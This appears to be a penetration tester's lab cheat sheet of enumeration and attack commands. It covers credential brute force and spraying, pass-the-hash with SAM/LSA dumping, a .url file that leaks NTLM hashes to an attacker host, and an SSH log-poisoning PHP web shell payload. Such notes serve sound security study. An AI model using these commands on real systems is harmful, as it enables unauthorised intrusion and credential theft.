**GOBUSTER:**
```
gobuster dir -u $URL -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30 > Dir.txt
```

```
gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30 --exclude-length 162
```

```
gobuster dir -u $URL -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30 > Files.txt
```

**`-b` to exclude status codes** 
-k for https 
-x zip


**To search for .txt .log files ->**
```
dir /s/b *.txt
```
```
dir /s/b *.log
```
```
tree /f /a
```


**FTP ->** 
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```


**Feroxbuster:**
```
feroxbuster --url http://TARGET:80/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --filter-status 400,404
```

```

```

**WordPress:**
```
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
```

```
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt
```

```
wpscan --url $URL --enumerate p --plugins-detection aggressive
```

**WFUZZ:**
```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
```

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
```

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 "$URL"
```

**DirSearch:**
```
dirsearch -u http://capiclean.htb/ --exclude-status 403,404,400,401 -o dir
```

Directories
```
dirsearch -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x 404 -e html,htm,txt,php
```

```
dirsearch -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt -x 404 -e html,htm,txt,php
```

Files:
```
dirsearch -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -x 404
```

FUZZ DATA AND CHECK FOR PARAMETERS:
```
export URL="https://example.com/?parameter=FUZZ
```
--> and/or some combination of...
```
export URL="https://example.com/?FUZZ=data
```

```
wfuzz -c -z file,/usr/share/secLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
```

```
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"
```

**BUST SUB-DOMAINS:**
```
gobuster dns -d someDomain.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
```
**--> Make sure any DNS name you find resolves to an in-scope address before you test it.**

**SMTP:**
```
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```

```
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```

```
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```

```
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```

**SNMP:**

```
nmap --top-ports 100 -sU $IP
```

```
nmap -Pn -p161 -sU -sV TARGET
```

```
nmap -p161 -sU -A TARGET
```

```
snmpwalk -c public -v2c TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
```


**FFUF:**
```
ffuf -u http://TARGET/config/FUZZ -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/quickhits.txt -fw 20
```

**NMAP:**
```
nmap --script=smb-vuln* -p 139,445 $IP
```

```
nmap -p- -sV -sC -vvv $IP --open -oN nmap
```

```
nmap --top-ports 100 -sU $IP
```

```
nmap -sU $IP
```

```
nmap --script=smb-enum-shares $IP
```

```
nmap --script "ldap* and not brute" $ip -p 389 -v -Pn -sT
```

```
nmap --script "ldap*" TARGET -p 389 -v -Pn -sT
```

```
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='nara-security.com' TARGET
```

```
nmap -p 3306 --script mysql-* $IP
```

```
nmap --script vuln $IP
```

```
ldapsearch -x -H ldap://$IP -b “dc=access,dc=offsec”
```
Operations error = needs creds
```
ldapsearch -x -H ldap://$IP -b “dc=access,dc=offsec” -w <password>
```


**SMBCLIENT:**
```
smbclient -L \\TARGET\
```

```
smbclient \\TARGET\ -N
```

```
smbclient \\\\TARGET\\dev
```

**ldapsearch:**
```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://TARGET" "(objectclass=*)"
```

```
ldapsearch -x -h TARGET -b "dc=hutch,dc=offsec" > ldap_search.txt
```

```
ldapsearch -x -H ldap://$ip -b “dc=Kyotosoft,DC=com”
```

```
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip TARGET
```

```
./kerbrute userenum -d resourced users --dc TARGET
```

```
cat ldap_search.txt | grep -i "samaccountname"
```

```
cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
```

**Crackmapexec:**
I use this one the most ->

```
netexec smb TARGET/24 -u users -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -u user -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -u user -p pass --continue-on-success --local-auth
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -H f26c0186c8ffcceb01fd2d7549e7ac1f --continue-on-success
```

```
crackmapexec winrm TARGET/24 -d medtech.com -u user -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -p pass --continue-on-success --shares
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -H f26c0186c8ffcceb01fd2d7549e7ac1f --continue-on-success --sam
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -H f26c0186c8ffcceb01fd2d7549e7ac1f --continue-on-success --lsa
```

**SMB:**
```
responder -I tun0 -v
```
only works if message signing is enabled but not required 
```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\ATTACKER\%USERNAME%.icon
IconIndex=1
```
OffSec.url


**Droopescan:**
```
git clone https://github.com/SamJoan/droopescan.git
```

```
cd droopescan
```

```
sudo pip3 install -r requirements.txt
```

```
droopescan scan joomla -u geeksforgeeks.org
```

https://youtu.be/h1Br5umYxwc?si=jKqOrs9lO-34ap-a**SNMP**:
```
nmap -sU -p161 --script *snmp* $target
```

Default Credentials -
-  PHPmyadmin - root : toor 

To decode QR code -
```
zbarimg decoded.png
```



SSH log poisoning  (/var/log/auth.log)
```
root@kali:/home/kali/... nc -nv $IP 22
(UNKNOWN) [TARGET] 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
Mr.Robot/<?php passthru($_GET['cmd']); ?>    
Protocol mismatch.

```
```
Mr.Robot/<?php passthru($_GET['cmd']); ?>
```

